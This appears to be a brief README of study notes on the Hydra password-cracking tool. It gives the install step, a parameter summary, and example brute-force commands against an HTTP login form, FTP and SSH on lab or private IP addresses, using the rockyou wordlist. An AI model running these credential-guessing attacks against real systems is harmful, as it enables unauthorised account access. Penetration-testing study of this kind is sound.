[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

# hydra
[https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra]
<hr/>

## install hydra in Linux
```sh
sudo dnf -y install hydra
```

## How hydra works
Using Hydra to Brute-Force Our First Login Page

Hydra is a fairly straight forward tool to use, but we have to first understand what it needs to work correctly. We’ll need to provide the following in order to break in:

- Login or Wordlist for Usernames
- Password or Wordlist for Passwords
- IP address or Hostname        
- HTTP Method (POST/GET)
- Directory/Path to the Login Page
- Request Body for Username/Password
- A Way to Identify Failed Attempts



> hydra -l <username> -p <password> <server> <service> -s <port> -t <thread> -o <output>
> -L <users> -P <passwords>

```sh
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```

```sh
hydra -L username.txt -P password.txt 192.168.1.37 ftp -s 21
```

hydra -l <username> -p <password> ssh://<ip>